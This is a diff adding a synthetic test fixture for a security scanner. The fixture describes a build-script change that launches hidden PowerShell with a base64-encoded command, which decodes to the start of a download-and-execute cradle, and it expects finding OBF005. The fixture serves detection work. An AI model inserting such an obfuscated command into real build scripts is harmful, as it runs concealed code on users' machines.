@@ -1,0 +1,12 @@
+kind = "risky"
+title = "Build script launches PowerShell with an encoded command"
+source = "synthetic; MITRE ATT&CK T1027 / T1059.001"
+expect = ["OBF005 scripts/build.ps1:2"]
+
+[[file]]
+path = "scripts/build.ps1"
+removed = ["dotnet build -c Release"]
+added = [
+    "dotnet build -c Release",
+    "powershell.exe -NoProfile -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
+]
